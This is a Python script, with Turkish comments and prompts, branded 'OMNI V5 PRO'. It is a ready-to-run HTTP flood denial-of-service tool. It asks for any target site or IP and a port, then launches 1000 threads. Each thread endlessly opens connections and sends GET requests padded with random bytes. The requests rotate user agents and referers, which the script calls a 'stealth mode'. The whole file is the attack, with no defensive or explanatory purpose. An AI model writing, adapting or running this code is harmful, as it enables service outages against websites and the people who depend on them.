import socket
import threading
import random
import os

# V5 PRO - AKILLI KIMLIK VE HIZ MODULU
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Android 14; Mobile; rv:125.0) Gecko/125.0 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15"
]

referers = ["https://www.google.com/", "https://www.facebook.com/", "https://duckduckgo.com/"]

os.system("clear")
print("\033[1;31m")
print("""
    ██████╗ ███╗   ███╗███╗   ██╗██╗    ██╗   ██╗███████╗
    ██╔═══██╗████╗ ████║████╗  ██║██║    ██║   ██║██╔════╝
    ██║   ██║██╔████╔██║██╔██╗ ██║██║    ██║   ██║███████╗
    ██║   ██║██║╚██╔╝██║██║╚██╗██║██║    ╚██╗ ██╔╝╚════██║
    ╚██████╔╝██║ ╚═╝ ██║██║ ╚████║██║     ╚████╔╝ ███████║
     ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝      ╚═══╝  ╚══════╝
    >>> V5 PRO: AUTO-RESOLVER & STEALTH MODE <<<
\033[0m""")

# Otomatik Domain Cozucu
target_input = input("\033[1;33mHedef (Site veya IP): \033[0m")
try:
    target_ip = socket.gethostbyname(target_input)
    print(f"\033[1;32m[!] Hedef Cozuldu: {target_ip}\033[0m")
except:
    target_ip = target_input

target_port = int(input("\033[1;33mPort (Orn: 443 veya 80): \033[0m"))
power = int(input("\033[1;33mGuc (Orn: 2048): \033[0m"))

def v5_engine():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((target_ip, target_port))
            
            # Akilli HTTP Paketi
            pkt = f"GET /?{random.randint(1,5000)} HTTP/1.1\r\nHost: {target_ip}\r\n"
            pkt += f"User-Agent: {random.choice(user_agents)}\r\n"
            pkt += f"Referer: {random.choice(referers)}\r\n\r\n"
            
            s.send(pkt.encode() + os.urandom(power))
            print(f"\033[1;36m[V5-ATTACK] -> {target_ip} | STEALTH: ON\033[0m")
            s.close()
        except:
            pass

# Redmi 15 Gucu (1000 Thread)
for _ in range(1000):
    threading.Thread(target=v5_engine, daemon=True).start()

input("\n\033[1;37mDurdurmak icin Enter'a bas...\033[0m")

